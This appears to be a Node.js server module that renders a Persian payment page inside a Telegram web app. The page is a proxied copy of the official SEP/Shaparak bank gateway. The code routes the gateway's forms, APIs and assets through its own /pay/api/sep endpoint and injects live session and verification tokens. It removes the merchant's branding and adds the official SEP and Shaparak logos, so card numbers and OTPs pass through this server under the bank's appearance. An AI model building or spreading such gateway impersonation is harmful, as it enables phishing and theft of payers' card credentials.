"use strict";

const fs = require("fs");
const path = require("path");
const cheerio = require("cheerio");
const { createLogger } = require("./logger");
const { resolveBankSlugFromPan, bankLogoUrl } = require("./bankLogo");

const log = createLogger("renderPage");

let cachedTemplate = null;

function loadTemplate() {
  // Always re-read in case brand HTML/CSS was updated without process restart
  const templatePath = path.join(__dirname, "..", "index.html");
  const next = fs.readFileSync(templatePath, "utf8");
  if (next !== cachedTemplate) {
    cachedTemplate = next;
    log.debug("Gateway HTML template loaded", { templatePath, length: cachedTemplate.length });
  }
  return cachedTemplate;
}

function escapeJsString(value) {
  return String(value ?? "")
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");
}

function renderErrorPage(message, trackId, code) {
  const { sanitizePublicMessage: sanitize } = require("./gatewayErrors");
  const safeMessage =
    sanitize(message) || "بارگذاری درگاه پرداخت ناموفق بود. لطفاً دوباره تلاش کنید.";
  const errorCode = String(code || "PG03").toUpperCase();
  log.warn("Rendering error page", { code: errorCode, trackId });

  const retryHref = trackId ? `/pay/start/${encodeURIComponent(trackId)}` : "";
  const CHROME = "#e11d48";

  return `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>خطا — درگاه پرداخت</title>
  <meta name="color-scheme" content="light only">
  <meta name="theme-color" content="${CHROME}">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root { color-scheme: light only; }
    * { box-sizing: border-box; }
    html, body { margin: 0; min-height: 100%; height: 100%; }
    body {
      font-family: "Vazirmatn", "Tahoma", "Segoe UI", sans-serif;
      background: ${CHROME};
      color: #fff;
      -webkit-font-smoothing: antialiased;
    }
    .mpr {
      display: flex;
      flex-direction: column;
      min-height: 100dvh;
      max-height: 100dvh;
      overflow: hidden;
      background: ${CHROME};
    }
    .mpr__hero {
      flex: 0 0 48%;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      gap: 16px;
      padding: 20px 22px 18px;
      padding-top: calc(20px + env(safe-area-inset-top, 0px));
    }
    .mpr__status { display: flex; align-items: center; gap: 14px; width: 100%; }
    .mpr__status-mark {
      display: inline-flex; align-items: center; justify-content: center;
      width: 56px; height: 56px; border-radius: 18px;
      background: rgba(255,255,255,.16); color: #fff; flex: 0 0 auto;
    }
    .mpr__status-copy { display: flex; flex-direction: column; gap: 4px; min-width: 0; text-align: start; }
    .mpr__status-kicker {
      margin: 0; font-size: 12px; font-weight: 600; letter-spacing: .02em;
      color: rgba(255,255,255,.72); line-height: 1.2;
    }
    .mpr__status-title {
      margin: 0; font-size: clamp(26px, 7vw, 34px); font-weight: 900;
      letter-spacing: -.04em; line-height: 1.15; color: #fff;
    }
    .mpr__amount-block { display: flex; flex-direction: column; gap: 6px; width: 100%; }
    .mpr__amount-label {
      margin: 0; font-size: 16px; font-weight: 600; line-height: 1.7;
      color: rgba(255,255,255,.92); max-width: 28ch;
    }
    .mpr__code {
      display: inline-flex; align-items: center; gap: 8px;
      margin: 0; padding: 8px 12px; width: fit-content;
      border-radius: 999px; background: rgba(255,255,255,.14);
      font-size: 13px; font-weight: 700; letter-spacing: .04em;
      font-variant-numeric: tabular-nums;
    }
    .mpr__sheet {
      flex: 1 1 auto;
      display: flex; flex-direction: column; justify-content: flex-end;
      gap: 14px;
      background: #fff;
      color: #0f172a;
      border-radius: 28px 28px 0 0;
      padding: 22px 20px calc(22px + env(safe-area-inset-bottom, 0px));
      box-shadow: 0 -10px 40px rgba(15, 23, 42, .12);
    }
    .mpr__shop {
      border: 1px solid #e2e8f0;
      border-radius: 18px;
      padding: 14px 16px;
      background: #f8fafc;
    }
    .mpr__shop-kicker {
      margin: 0 0 4px; font-size: 12px; font-weight: 600; color: #64748b;
    }
    .mpr__shop-name {
      margin: 0; font-size: 17px; font-weight: 800; letter-spacing: -.02em;
    }
    .mpr__actions { display: flex; flex-direction: column; gap: 10px; }
    .mpr__btn {
      display: flex; align-items: center; justify-content: center;
      min-height: 52px; border-radius: 16px; border: 0;
      font: inherit; font-size: 16px; font-weight: 800;
      text-decoration: none; cursor: pointer;
    }
    .mpr__btn--primary { background: ${CHROME}; color: #fff; }
    .mpr__btn--ghost { background: #f1f5f9; color: #0f172a; }
    .mpr__hint { margin: 0; text-align: center; font-size: 12px; color: #94a3b8; line-height: 1.6; }
  </style>
  <script>
    (function () {
      var CHROME = "${CHROME}";
      document.documentElement.setAttribute("data-theme", "light");
      document.documentElement.style.colorScheme = "light";
      function apply() {
        var tg = window.Telegram && window.Telegram.WebApp;
        if (!tg) return false;
        try { tg.ready(); } catch (e) {}
        try { tg.expand && tg.expand(); } catch (e) {}
        try { tg.setHeaderColor && tg.setHeaderColor(CHROME); } catch (e) {}
        try { tg.setBackgroundColor && tg.setBackgroundColor(CHROME); } catch (e) {}
        try { tg.setBottomBarColor && tg.setBottomBarColor("#ffffff"); } catch (e) {}
        return true;
      }
      if (!apply()) {
        var n = 0, t = setInterval(function () { if (apply() || ++n >= 20) clearInterval(t); }, 100);
      }
    })();
  </script>
</head>
<body>
  <div class="mpr">
    <section class="mpr__hero">
      <div class="mpr__status">
        <span class="mpr__status-mark" aria-hidden="true">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
            <path d="M12 8v5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
            <circle cx="12" cy="16.5" r="1.2" fill="currentColor"/>
            <path d="M12 3.5 2.8 19.2a1.2 1.2 0 0 0 1 1.8h16.4a1.2 1.2 0 0 0 1-1.8L12 3.5Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
          </svg>
        </span>
        <div class="mpr__status-copy">
          <p class="mpr__status-kicker">درگاه پرداخت</p>
          <h1 class="mpr__status-title">پرداخت ناموفق</h1>
        </div>
      </div>
      <div class="mpr__amount-block">
        <p class="mpr__amount-label">${escapeHtml(safeMessage)}</p>
        <p class="mpr__code">کد خطا · ${escapeHtml(errorCode)}</p>
      </div>
    </section>
    <section class="mpr__sheet">
      <div class="mpr__shop">
        <p class="mpr__shop-kicker">تومانیت</p>
        <p class="mpr__shop-name">اتصال امن به درگاه پرداخت</p>
      </div>
      <div class="mpr__actions">
        ${
          retryHref
            ? `<a class="mpr__btn mpr__btn--primary" href="${escapeHtml(retryHref)}">تلاش مجدد</a>`
            : ""
        }
        <button type="button" class="mpr__btn mpr__btn--ghost" onclick="try{Telegram.WebApp.close()}catch(e){history.back()}">بستن</button>
      </div>
      <p class="mpr__hint">در صورت تکرار مشکل، کد خطا را برای پشتیبانی ارسال کنید.</p>
    </section>
  </div>
</body>
</html>`;
}

function rewriteSepAssetUrl(src) {
  if (!src) return src;
  if (src.startsWith("/assets/")) return src;
  try {
    const url = new URL(src, "https://sep.shaparak.ir");
    if (url.hostname.includes("shaparak.ir") || url.hostname.includes("sep.ir")) {
      return `/api/sep${url.pathname}${url.search}`;
    }
  } catch {
    /* keep original */
  }
  return src;
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

const {
  MERCHANT_NAME,
  applyMerchantBranding: brandPayment,
  isPaymentAssistantLabel,
} = require("./merchantBranding");

function renderGatewayPage(payment, zibalId) {
  const branded = brandPayment(payment);
  const merchant = {
    name: branded.merchantName || MERCHANT_NAME,
    terminal: branded.merchantTerminal,
    reference: branded.merchantReference,
    info: branded.merchantInfo || [],
  };

  log.info("Rendering Tomanit gateway page", {
    sessionKey: payment.sessionKey,
    merchantName: merchant.name,
    terminal: merchant.terminal,
    reference: merchant.reference,
    zibalId,
  });

  const $ = cheerio.load(loadTemplate(), { decodeEntities: false });
  $("html").attr("data-theme", "light").attr("style", "color-scheme: light");
  if (!$('meta[name="color-scheme"]').length) {
    $("head").prepend('<meta name="color-scheme" content="light only">');
  } else {
    $('meta[name="color-scheme"]').attr("content", "light only");
  }

  $('script[src="/pay/assets/js/demo.js"], script[src="/assets/js/demo.js"], script[src="assets/js/demo.js"]').remove();

  const sepApiBase = "/pay/api/sep/OnlinePG";
  const sepPostUrl = `${sepApiBase}/OnlinePG`;
  const safeSessionKey = escapeJsString(payment.sessionKey);

  $("script").each((_, el) => {
    const content = $(el).html();
    if (!content || !content.includes("userSessionKey")) return;

    let updated = content
      .replace(/userSessionKey\s*=\s*"[^"]*"/, `userSessionKey = "${safeSessionKey}"`)
      .replace(/hostAddress\s*=\s*"[^"]*"/, `hostAddress = "${sepApiBase}"`)
      .replace(/serverUrl\s*=\s*"[^"]*"/, `serverUrl = "${sepApiBase}"`)
      .replace(/actionUrl\s*=\s*"[^"]*"/, `actionUrl = "${sepPostUrl}"`)
      .replace(/removeEmailUrl\s*=\s*"[^"]*"/, `removeEmailUrl = "${sepApiBase}/Fa/Payment/RemoveEmail"`)
      .replace(/baseUrl:\s*"[^"]*"/, `baseUrl: "${sepApiBase}"`);

    $(el).html(updated);
  });

  $('input[name="SessionKey"]').val(payment.sessionKey);
  $('input[name="__RequestVerificationToken"]').val(payment.verificationToken);
  $("#frmPayment").attr("name", `frmPayment-${payment.sessionKey}`);

  // Forms must POST to SEP proxy — action="#" posts to /pay/start/:id (404).
  $("#frmPayment, #frmCancel, #frmFailedOtp, #frmCulture").attr("action", sepPostUrl);

  $("[data-timeout]").attr("data-timeout", payment.timeout);
  $(".remaining-time").text("00:00");

  $(".merchant-name h2").text(merchant.name);

  // Drop custom brand / merchant photo / پرداخت‌یار. Keep official SEP icon-font mark.
  $(".tomanit-logo, .tomanit-logo-footer, .header .card img.sep-logo, .footer img.sep-logo-mono").remove();
  $(".merchant-logo").remove();
  $(".merchant-info .item").each((_, el) => {
    const label = ($(el).find("span").first().text() || "").trim();
    if (isPaymentAssistantLabel(label)) $(el).remove();
  });

  const sepLogoHtml =
    '<i class="icn-sep" aria-hidden="true"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span><span class="path8"></span></i>';

  const $sep = $(".header .card > i.icn-sep").first();
  if (!$sep.length) {
    $(".header .card").prepend(sepLogoHtml);
  } else if ($sep.find(".path1").length < 8) {
    $sep.replaceWith(sepLogoHtml);
  }

  if (!$(".header .card .icn-shaparak").length) {
    $(".header .card").append('<i class="icn-shaparak" aria-hidden="true"></i>');
  }

  if (!$(".footer .supervisors .icn-sep-mono").length) {
    $(".footer .supervisors").html('<i class="icn-sep-mono" aria-hidden="true"></i>');
  }

  const lockedPan = String(payment.lockedPan || "").replace(/\D/g, "");
  if (lockedPan.length === 16) {
    const spaced = lockedPan.replace(/(.{4})/g, "$1 ").trim();
    const $pan = $("#CardNumber_PanString");
    $pan
      .val(spaced)
      .addClass("ignore unselect limited")
      .attr("readonly", "readonly")
      .attr("tabindex", "-1");
    $("#CardList").remove();
    $pan.siblings(".clear").remove();

    // Same as fillCard(): show bank logo from BIN
    const slug = resolveBankSlugFromPan(lockedPan);
    const logo = bankLogoUrl(slug);
    $(".card-logo")
      .addClass("is-visible")
      .attr("style", "display:block")
      .empty()
      .append(`<img src="${logo}" alt="" width="24" height="24" />`);
  }

  $(".purchase-value .value h2").text(payment.amount);
  $(".purchase-value .letters small").text(payment.amountLetters);

  const infoItems = $(".merchant-info .item");
  merchant.info.forEach((item, index) => {
    const $item = infoItems.eq(index);
    if (!$item.length) return;
    $item.find("span").first().text(item.label);
    $item.find("em").first().text(item.value);
  });

  if (payment.captchaSrc) {
    $("#CaptchaImage").attr("src", payment.captchaSrc);
  }
  $("#Year").attr("data-current-year", payment.currentYear);

  $("#Purchase").text(`پرداخت\n        ${payment.amount}`);

  let html = $.html();
  // Ensure all local asset paths are under /pay (integrated shell)
  html = html.replace(/(href|src)="\/assets\//g, '$1="/pay/assets/');
  html = html.replace(/(href|src)='\/assets\//g, "$1='/pay/assets/");
  html = html.replace(/tomanit\.css\?v=\d+/g, "tomanit.css?v=25");
  html = html.replace(/app\.css\?v=\d+/g, "app.css?v=25");

  const bankLogoBoot =
    lockedPan.length === 16
      ? `
<script>
(function () {
  function ensureBankLogo() {
    try {
      var panEl = document.getElementById("CardNumber_PanString");
      var box = document.querySelector(".card-logo");
      if (!panEl || !box) return;
      if (box.querySelector("img") && box.classList.contains("is-visible")) return;
      var digits = String(panEl.value || "").replace(/\\D/g, "");
      if (digits.length < 6) return;
      var slug = typeof getBankName === "function" ? getBankName(digits.substring(0, 6)) : null;
      if (!slug) return;
      var base = typeof serverUrl !== "undefined" ? serverUrl : "/pay/api/sep/OnlinePG";
      box.classList.add("is-visible");
      box.style.display = "block";
      box.innerHTML = '<img src="' + base + "/bundle/icn/banks/" + slug + '.svg" width="24" height="24" alt="" />';
    } catch (e) {}
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", ensureBankLogo);
  else ensureBankLogo();
  window.addEventListener("load", ensureBankLogo);
})();
</script>`
      : "";

  const deferCaptcha = payment.deferCaptcha
    ? `
<script>
(function () {
  function applyCaptchaSrc(src) {
    if (!src) return;
    var img = document.getElementById("CaptchaImage");
    if (img) img.src = src;
  }
  function bootCaptcha() {
    var sk = typeof userSessionKey !== "undefined" ? userSessionKey : "";
    if (!sk) return;
    fetch("/pay/api/captcha/refresh", {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify({ sessionKey: sk })
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data && data.ok) {
          applyCaptchaSrc(data.captchaSrc || (data.image ? ("data:image/JPEG;base64," + data.image) : ""));
          return;
        }
        if (typeof getCaptcha === "function") getCaptcha();
      })
      .catch(function () {
        if (typeof getCaptcha === "function") getCaptcha();
      });
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bootCaptcha);
  } else {
    bootCaptcha();
  }
})();
</script>`
    : "";

  const themeBoot = `
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function () {
  var CHROME = "#2b73e3";
  var BOTTOM = "#f7f7fc";
  document.documentElement.setAttribute("data-theme", "light");
  document.documentElement.style.colorScheme = "light";
  function applyChrome() {
    var tg = window.Telegram && window.Telegram.WebApp;
    if (!tg) return false;
    document.documentElement.setAttribute("data-theme", "light");
    try { tg.ready(); } catch (e) {}
    try { tg.expand && tg.expand(); } catch (e) {}
    try { tg.setHeaderColor && tg.setHeaderColor(CHROME); } catch (e) {}
    try { tg.setBackgroundColor && tg.setBackgroundColor(CHROME); } catch (e) {}
    try { tg.setBottomBarColor && tg.setBottomBarColor(BOTTOM); } catch (e) {}
    return true;
  }
  if (!applyChrome()) {
    var tries = 0;
    var timer = setInterval(function () {
      tries += 1;
      if (applyChrome() || tries >= 20) clearInterval(timer);
    }, 100);
  }
  document.addEventListener("DOMContentLoaded", applyChrome);
  window.addEventListener("load", applyChrome);
})();
</script>${bankLogoBoot}${deferCaptcha}`;
  if (html.includes("</head>")) {
    html = html.replace("</head>", `${themeBoot}\n</head>`);
  } else {
    html += themeBoot;
  }

  log.info("Gateway page rendered", { htmlLength: html.length, deferCaptcha: !!payment.deferCaptcha });
  return html;
}

module.exports = { renderGatewayPage, renderErrorPage, loadTemplate };
